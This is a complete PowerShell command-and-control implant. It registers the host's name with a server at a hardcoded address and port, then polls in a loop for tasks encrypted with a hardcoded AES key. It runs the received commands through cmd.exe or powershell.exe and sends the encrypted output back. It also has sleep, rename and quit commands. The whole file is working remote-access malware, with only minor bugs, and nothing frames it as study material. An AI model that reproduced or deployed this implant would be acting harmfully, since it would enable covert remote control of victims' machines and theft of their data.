function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    Write-Host $key
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

function shell($fname, $arg){
    
    $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName               = $fname
    $pinfo.RedirectStandardError  = $true
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute        = $false
    $pinfo.Arguments              = $arg
    $p                            = New-Object System.Diagnostics.Process
    $p.StartInfo                  = $pinfo
    
    $p.Start() | Out-Null
    $p.WaitForExit()
    
    $stdout = $p.StandardOutput.ReadToEnd()
    $stderr = $p.StandardError.ReadToEnd()

    $res = "VALID $stdout`n$stderr"
    $res
}

$ip   = "192.168.0.28"
$port = "9090"
## secrets.token_hex(32)
## secrets.token_urlsafe(32)
$key  = 'SP8Y4Uv9KRtnoJqefyBolUHjtm96PdG28JVD2V3PAeo='
$n    = 2
$name = ""
$code = ""

$hname = [System.Net.Dns]::GetHostName()
$type  = "powershell"
$regl  = ("http" + ':' + "//$ip" + ':' + "$port/beacon/register")
$data  = @{
    name = "$hname" 
    type = "$type"
    }
$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
sleep $n

$resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/")
$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")

for (;;){

    Write-Host "Doing one more loop"
    
    ### check response NOT existence
    $taskId = ""
    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
    # $task = ""
    Write-Host $task
    
    if (-Not [string]::IsNullOrEmpty($task)){
        
        $task = Decrypt-String $key $task
        Write-Host $task
        $task = $task.split()
        $flag = $task[0]
        $taskId = $task[1]
        
        if ($flag -eq "VALID"){
            
            $decoded_command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($task[2]))
            $decoded_command = $decoded_command.split()
            $command = $decoded_command[0]
            $args = $decoded_command[1..$decoded_command.Length]

            if ($command -eq "shell"){
            
                $f    = "cmd.exe"
                $arg  = "/c "
            
                foreach ($a in $args){ $arg += $a + " " }

                $res  = shell $f $arg
                $res  = Encrypt-String $key $res
                $data = @{result = "$res"}

                $resultfl = ("$resultl" + "$taskId")
                
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'

            }
            elseif ($command -eq "powershell"){
            
                $f    = "powershell.exe"
                $arg  = "/c "
            
                foreach ($a in $args){ $arg += $a + " " }

                $res  = shell $f $arg
                $res  = Encrypt-String $key $res
                $data = @{result = "$res"}

                $resultfl = ("$resultl" + "$taskId")
                
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'

            }
            elseif ($command -eq "sleep"){

                $n    = [int]$args[0]
                $res = "sleep set to " + "$args[0]" + "sec"
                $res  = Encrypt-String $key
                $data = @{result = "$res"}
                $resultfl = ("$resultl" + "$taskId")
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
            }
            elseif ($command -eq "rename"){
                
                $name    = $args[0]
                $res = "VALID agent renamed to " + "$name"
                $res  = Encrypt-String $key $res
                $data    = @{result = "$res"}
                $resultfl = ("$resultl" + "$taskId")
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
            }
            elseif ($command -eq "quit"){
                $res = "VALID agent dead " + "$name"
                $res  = Encrypt-String $key $res
                $data    = @{result = "$res"}

                $resultfl = ("$resultl" + "$taskId")
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'

                exit
            }
        }
    }
    sleep $n
}